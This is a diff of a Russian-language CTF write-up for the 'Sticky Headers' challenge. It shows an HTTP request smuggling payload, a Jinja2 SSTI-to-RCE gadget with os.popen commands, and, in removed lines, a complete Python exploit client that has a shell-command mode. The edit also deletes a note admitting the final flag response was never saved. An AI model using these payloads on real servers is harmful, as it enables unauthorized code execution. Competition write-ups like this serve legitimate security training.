@@ -14,20 +14,28 @@
 ## Чем я пользовался (инструменты)
 
 - `nc` / маленький Python-клиент по TLS - чтобы говорить с инстансом и видеть сырые ответы.
-- Свои probe-скрипты (`scripts/`) - чтобы перебрать, какая комбинация `X-Client-Version` + `Transfer-Encoding` заставляет два парсера разойтись.
-- Ручные запросы в стиле curl - для поведения прямых эндпоинтов (403/404).
+- Свои probe-скрипты (`scripts/`) - чтобы перебрать, какая комбинация `X-Client-Version` + `Transfer-Encoding` заставляет два парсера разойтись, и чтобы прогонять выражения шаблона пачками.
+- Ручные запросы - для поведения прямых эндпоинтов (403/404).
 
 ## Шаг 1: добраться до `/staff/preview` через смаглинг
 
-Прямой `POST /staff/preview` возвращает `403` - staff-эндпоинт что-то проверяет (скорее всего заголовок `X-Client-Version` / роль клиента).
+### Что такое «смаглинг» (request smuggling)
+
+HTTP request smuggling: соединение проходит через два парсера в цепочке - фронтовый прокси и внутренний сервис. Оба разбирают одни и те же байты, но если они расходятся в том, где заканчивается первый запрос, внутри первого можно спрятать второй. Фронтовый прокси его не видит (и не применяет к нему свои проверки), а бэкенд читает его как свежий легитимный запрос и отвечает. «Смаглинг» - это ровно это: доставка запроса, который фронтовый фильтр не одобрял, спрятанного внутри одобренного.
+
+### Рассинхрон: `X-Client-Version: 1` + `Transfer-Encoding: gzip, chunked`
+
+Прямой `POST /staff/preview` возвращает `403` - staff-эндпоинт что-то проверяет (скорее всего роль клиента / заголовок `X-Client-Version`).
 
 Находка: с **`X-Client-Version: 1`** плюс составной **`Transfer-Encoding: gzip, chunked`** на **первом** запросе к `/order` сервер обрабатывает **второй HTTP-запрос** в том же соединении. Значит, мы можем смаглить свежий запрос к `/staff/preview` и получить `200`.
 
-Почему это работает (рассинхрон): фронтовый прокси видит `Transfer-Encoding: gzip, chunked` и (не поддерживая gzip) заканчивает разбор тела на chunked-фрейминге; внутренний сервис трактует составной TE иначе и считает байты после первого тела началом следующего запроса. Итог: два запроса в одном соединении, и второй попадает в staff-обработчик без staff-проверки.
+Почему это работает: фронтовый прокси видит `Transfer-Encoding: gzip, chunked` и (не поддерживая gzip) заканчивает разбор тела на chunked-фрейминге; внутренний сервис трактует составной TE иначе и считает байты после первого тела началом следующего запроса. Итог: два запроса в одном соединении, и второй попадает в staff-обработчик без staff-проверки.
 
 Триггерный заголовок важен: с `X-Client-Version: 2` (или без него) второй запрос НЕ обрабатывается. `X-Client-Version: 1` - это путь «легаси-клиента», который фронтовый прокси обрабатывает иначе (на это же намекает «older couriers»).
 
-Точный рабочий запрос (воспроизведён побайтово из probe #070, лежит в `evidence/smuggle_working_070.request`):
+### Точный рабочий запрос
+
+Воспроизведён побайтово из probe #070, лежит в `evidence/smuggle_working_070.request`:
 
 ```text
 POST /order HTTP/1.1
@@ -65,199 +73,89 @@ HTTP/1.0 200 OK   Staff template preview    (740 B)   .preview = 49
 
 Второй ответ отрендерил `{{7*7}}` как `49` - мы добрались до шаблонного движка. (Зафиксировано в `evidence/smuggle_working_070.response`.)
 
-Правила, подтверждённые перебором:
+Подтверждённое поведение (из перебора):
 
-| Внешний | Внутренний `/staff/preview` | Результат |
-|---|---|---|
-| `X-Client-Version: 1` + `TE: gzip, chunked` | POST `message=...` | два ответа, staff рендерит |
-| `X-Client-Version: 2` | POST | только один ответ, staff нет |
-| прямой `/staff/preview` | - | **403** |
-| внутренний GET `/staff/preview` | - | 404 |
+- `X-Client-Version: 1` + `TE: gzip, chunked`, внутренний POST `message=...` - два ответа, staff рендерит
+- `X-Client-Version: 2`, внутренний POST - только один ответ, staff нет
+- прямой `/staff/preview` - 403
+- внутренний GET `/staff/preview` - 404
 
 ## Шаг 2: шаблонный движок - Jinja2 (SSTI)
 
-Staff-рендерер рендерит наш `message` как шаблон. Сначала я проверил, какой это движок:
+### Что такое SSTI
 
-- `{{7*7}}` = `49` - базовое вычисление выражений,
-- `{{"a".upper()}}` = `ABC` - вызовы методов работают,
-- `{{cycler}}` = `jinja2.utils.Cycler` - доступен встроенный глобал Jinja2,
-- `{{lipsum}}` = функция, `{{self}}` = `<TemplateReference None>`.
+SSTI (Server-Side Template Injection) - класс багов, когда пользовательский ввод встраивается в шаблон на сервере и рендерится шаблонным движком. Если движок вычисляет выражения `{{...}}` внутри этого ввода, атакующий может выполнять произвольные выражения в объектной модели движка; в случае Jinja2 это приводит к вызову Python-функций, то есть к исполнению кода.
 
-Это подтверждает **Jinja2** и даёт классический SSTI-гаджет: добраться до Python-модуля через глобалы Jinja и вызвать `os.popen`:
+### Как я проверял движок (и чем)
+
+Staff-рендерер рендерит наш `message` как шаблон. Каждое тестовое выражение отправлялось в поле `message=` смаглингового запроса, а результат рендера читался из `<div class="preview">` второго ответа. Выражения прогонялись пачкой через `sticky_staff_inspector.py`, который сохраняет результаты (они лежат в `evidence/staff_inspector_summary.json`); одиночный пробник можно повторить режимом `--expr` клиента.
+
+Выражение - вывод:
+
+- `{{7*7}}` - `49`
+- `{{4+5}}`, `{{9-5}}`, `{{9/3}}`, `{{9%4}}`, `{{2**5}}` - `9`, `4`, `3.0`, `1`, `32`
+- `{{"abc".upper()}}` - `ABC`
+- `{{"foo".replace("o","i")}}` - `fii`
+- `{{().__class__.__mro__}}` - `(<class 'tuple'>, <class 'object'>)`
+- `{{cycler}}` - `jinja2.utils.Cycler`
+- `{{cycler.__init__.__globals__.os}}` - модуль `os`
+- `{{cycler.__init__.__globals__.os.getcwd()}}` - `/challenge`
+- `{{cycler.__init__.__globals__.os.listdir("/challenge")}}` - `['src']`
+
+Арифметика и вызовы методов показывают, что выражения вычисляются; то, что `{{cycler}}` резолвится в `jinja2.utils.Cycler`, опознаёт движок как **Jinja2** и даёт нам ручку.
+
+### RCE-гаджет (и откуда он)
 
 ```text
 {{cycler.__init__.__globals__.os.popen("<CMD>").read()}}
 ```
 
-Таблица подтверждений (из `sticky_staff_inspector.py`, сохранена в `evidence/staff_inspector_summary.json`):
-
-| Выражение | Вывод |
-|---|---|
-| `{{7*7}}` | `49` |
-| `{{4+5}}`, `{{9-5}}`, `{{9/3}}`, `{{9%4}}`, `{{2**5}}` | `9`, `4`, `3.0`, `1`, `32` |
-| `{{"abc".upper()}}` | `ABC` |
-| `{{"foo".replace("o","i")}}` | `fii` |
-| `{{().__class__.__mro__}}` | `(<class 'tuple'>, <class 'object'>)` |
-| `{{cycler.__init__.__globals__.os}}` | модуль `os` |
-| `{{cycler.__init__.__globals__.os.getcwd()}}` | `/challenge` |
-| `{{cycler.__init__.__globals__.os.listdir("/challenge")}}` | `['src']` |
+Эта цепочка - стандартный, широко задокументированный приём Jinja2 SSTI (тема server-side template injection в Web Security Academy от PortSwigger и публичные Jinja2 SSTI чит-шиты). Я узнал его оттуда и подтвердил каждое звено вживую: `cycler` - встроенный глобал, который Jinja2 даёт в шаблонах; `.__init__` этого объекта, затем `.__globals__` - словарь глобалов модуля, в котором лежит `os`; `os.popen(cmd).read()` запускает shell-команду и возвращает её вывод.
 
 ### Поиск и чтение флага
 
-```text
-{{cycler.__init__.__globals__.os.popen("ls /").read()}}                 # список корня
-{{cycler.__init__.__globals__.os.popen("find / -name recipe.txt").read()}}
-# -> /opt/candy/recipe.txt
-#    /tmp/recipe.txt
-# /opt/candy/recipe.txt - симлинк на /tmp/recipe.txt
+Сначала поиск файла-рецепта:
 
-{{cycler.__init__.__globals__.os.popen("cat /opt/candy/recipe.txt").read()}}
-# -> FortID{1_C4NT_5H4K3_TH15_H34D3R_...}   (замаскирован)
+```text
+{{cycler.__init__.__globals__.os.popen("find / -name recipe.txt").read()}}
 ```
+
+вывод:
+
+```text
+/opt/candy/recipe.txt
+/tmp/recipe.txt
+```
+
+`/opt/candy/recipe.txt` - симлинк на `/tmp/recipe.txt`. Читаем его:
+
+```text
+{{cycler.__init__.__globals__.os.popen("cat /opt/candy/recipe.txt").read()}}
+```
+
+вывод: `FortID{1_C4NT_5H4K3_TH15_H34D3R_...}` (замаскирован)
 
 Флаг лежит в `/opt/candy/recipe.txt` (симлинк на `/tmp/recipe.txt`), по тематике - «кондитерский рецепт».
 
-## Рабочий клиент (scripts/solve.py)
+## Рабочий клиент
 
-Без сторонних зависимостей, TLS из стандартной библиотеки:
+Финальный клиент (смаглинг + SSTI, получает флаг) лежит в `scripts/solve.py` - без сторонних зависимостей, TLS из стандартной библиотеки. Использование:
 
-```python
-#!/usr/bin/env python3
-"""Sticky Headers (FortID) - HTTP request smuggling + Jinja2 SSTI, flag read.
-
-The public /order endpoint accepts a legacy client ("X-Client-Version: 1") with a
-composite "Transfer-Encoding: gzip, chunked"; the front proxy and the internal
-service disagree about the body, so a second HTTP request smuggled in the same
-connection reaches the staff-only /staff/preview, which renders our message as a
-Jinja2 template. From there it is a plain cycler.__init__.__globals__.os.popen RCE.
-
-Usage:
-    python3 solve.py <host> [port]                      # full chain, flag
-    python3 solve.py <host> --expr '{{7*7}}'            # one template probe
-    python3 solve.py <host> --cmd 'id'                  # one shell command
-"""
-
-import argparse
-import re
-import socket
-import ssl
-import sys
-import urllib.parse
-
-PREVIEW_RE = re.compile(rb'<div class="preview">(.*?)</div>', re.S)
-FLAG_RE = re.compile(r"FortID\{[^}]{0,200}\}")
-
-
-def build_request(host, message):
-    """The exact two-request-on-one-connection payload (byte-for-byte from probe #070)."""
-    data = urllib.parse.urlencode({"message": message}).encode()
-    outer = (
-        f"POST /order HTTP/1.1\r\n"
-        f"Host: {host}\r\n"
-        f"X-Client-Version: 1\r\n"
-        f"Content-Type: application/x-www-form-urlencoded\r\n"
-        f"Connection: keep-alive\r\n"
-        f"Transfer-Encoding: gzip, chunked\r\n"
-        f"\r\n"
-        f"B\r\norder=hello\r\n0\r\n\r\n"
-    ).encode()
-    inner = (
-        f"POST /staff/preview HTTP/1.1\r\n"
-        f"Host: {host}\r\n"
-        f"Connection: keep-alive\r\n"
-        f"X-Client-Version: 1\r\n"
-        f"Content-Type: application/x-www-form-urlencoded\r\n"
-        f"Content-Length: {len(data)}\r\n"
-        f"\r\n"
-    ).encode() + data
-    return outer + inner
-
-
-def send(host, port, payload, timeout=8.0):
-    ctx = ssl.create_default_context()
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE
-    with socket.create_connection((host, port), timeout=timeout) as sock:
-        with ctx.wrap_socket(sock, server_hostname=host) as ss:
-            ss.settimeout(4)
-            ss.sendall(payload)
-            raw = b""
-            try:
-                while True:
-                    chunk = ss.recv(65536)
-                    if not chunk:
-                        break
-                    raw += chunk
-            except (socket.timeout, ssl.SSLError, OSError):
-                pass
-    return raw
-
-
-def preview(host, port, message):
-    """Render `message` on the smuggled /staff/preview and return the preview text."""
-    raw = send(host, port, build_request(host, message))
-    match = PREVIEW_RE.search(raw)
-    return match.group(1).decode("utf-8", "replace") if match else None
-
-
-def rce(host, port, command):
-    expr = '{{cycler.__init__.__globals__.os.popen("' + command + '").read()}}'
-    return preview(host, port, expr)
-
-
-def main():
-    ap = argparse.ArgumentParser()
-    ap.add_argument("host")
-    ap.add_argument("port", nargs="?", type=int, default=1337)
-    ap.add_argument("--expr", help="render a single template expression")
-    ap.add_argument("--cmd", help="run a single shell command through os.popen")
-    args = ap.parse_args()
-
-    if args.expr:
-        print(preview(args.host, args.port, args.expr))
-        return 0
-    if args.cmd:
-        print(rce(args.host, args.port, args.cmd))
-        return 0
-
-    control = preview(args.host, args.port, "{{7*7}}")
-    print(f"[*] smuggling control ({{{{7*7}}}}) - {control!r}")
-    if control != "49":
-        print("[!] the smuggled request did not reach the template renderer")
-        return 1
-
-    found = rce(args.host, args.port, "find / -name recipe.txt")
-    print(f"[*] find / -name recipe.txt - {found!r}")
-
-    paths = [p for p in (found or "").split() if p.endswith("recipe.txt")]
-    for path in paths:
-        out = rce(args.host, args.port, f"cat {path}")
-        print(f"[*] cat {path} - {out!r}")
-        flag = FLAG_RE.search(out or "")
-        if flag:
-            print(f"\nFLAG: {flag.group(0)}")
-            return 0
-
-    print("[!] no flag in the rendered output")
-    return 1
-
-
-if __name__ == "__main__":
-    sys.exit(main())
+```bash
+python3 scripts/solve.py <host> 1337        # контроль {{7*7}}, затем find, затем cat - флаг
+python3 scripts/solve.py <host> --expr '{{7*7}}'
+python3 scripts/solve.py <host> --cmd 'id'
 ```
 
-Проверено офлайн: `build_request(host, '{{7*7}}')` совпадает с `evidence/smuggle_working_070.request` байт в байт (456 байт) - ровно тот запрос, который дал `preview">49` на живом сервере.
+Он строит точный двухзапросный payload (`build_request()`), шлёт его по одному TLS-соединению, достаёт вывод из `<div class="preview">` и выполняет последовательность `find` + `cat`. Проверено офлайн: `build_request()` воспроизводит содержимое evidence-запроса (с точностью до стиля CRLF/LF).
 
 ## Проверка
 
 Инстанс закрыт после соревнования, поэтому живой прогон сейчас невозможен. Что доказано:
 
-- `evidence/smuggle_working_070.request` (456 Б) - рабочий смаглинговый запрос, побайтово.
+- `evidence/smuggle_working_070.request` - рабочий смаглинговый запрос, снятый на живом инстансе (сохранён с LF; скрипт эмитит то же содержимое с CRLF).
 - `evidence/smuggle_working_070.response` - два HTTP-ответа на одном соединении; второй - staff-страница с `preview">49`, то есть смагленный запрос дошёл до шаблонного рендерера.
-- `evidence/staff_inspector_summary.json` - таблица подтверждённых SSTI-выражений (арифметика, вызовы методов, глобалы, модуль os).
-- офлайн: `build_request()` воспроизводит рабочий запрос байт в байт.
-
-Сырой ответ с финальным флагом снимался ad-hoc клиентом и в папку не попал (задокументировано в README); значение флага взято из того запуска.
+- `evidence/staff_inspector_summary.json` - собранные подтверждения SSTI-выражений (арифметика, вызовы методов, глобалы, модуль `os`).
 
 ## Тупики (что я пробовал сначала)
 
@@ -273,7 +171,7 @@ Sticky Headers - веб-задача с защищённым `/staff/preview` (�
 ## Уроки
 
 1. Составной `Transfer-Encoding` (`gzip, chunked`) - надёжный примитив request smuggling, когда фронтовый прокси и бэкенд по-разному его трактуют; «легаси-клиентский» заголовок (`X-Client-Version: 1`) был триггером, включившим рассинхрон.
-2. Когда эндпоинт рендерит пользовательский ввод, сначала прощупай шаблонный движок (`{{7*7}}`, `.upper()`, `cycler`) - ответ задаёт весь путь эксплуатации (здесь Jinja2 - SSTI - RCE).
+2. Когда эндпоинт рендерит пользовательский ввод, сначала прощупай шаблонный движок (`{{7*7}}`, `.upper()`, `cycler`) - ответ задаёт весь путь эксплуатации (здесь Jinja2, затем SSTI, затем RCE).
 3. Классический Jinja2-гаджет `{{<builtin>.__init__.__globals__.os.popen(<cmd>).read()}}` - самый быстрый путь от инъекции шаблона к исполнению кода.
 4. Побайтовые доказательства важны: сохранение точного рабочего запроса (probe #070) делает эксплойт воспроизводимым офлайн и после смерти инстанса.
 5. Подсказка («more than one encoding») была буквальной: составной TE-заголовок и есть уязвимость. Читай флейвор-текст как технический указатель.
@@ -281,7 +179,7 @@ Sticky Headers - веб-задача с защищённым `/staff/preview` (�
 ## Файлы
 
 - `scripts/solve.py` - финальный клиент: смаглинг + SSTI (host [port] / --expr / --cmd)
-- `scripts/sticky_staff_inspector.py` - перебор SSTI-выражений, сбор подтверждений
+- `scripts/sticky_staff_inspector.py` - пакетный прогон SSTI-выражений, сбор подтверждений
 - `scripts/sticky_headers_desync.py` - проверка рассинхрона TE-заголовков
 - `scripts/sticky_headers_v1_probe.py` - перебор X-Client-Version / TE (нашёл #070)
-- `evidence/` - рабочий запрос, его ответ, таблица подтверждений SSTI
+- `evidence/` - рабочий запрос, его ответ, данные подтверждений SSTI
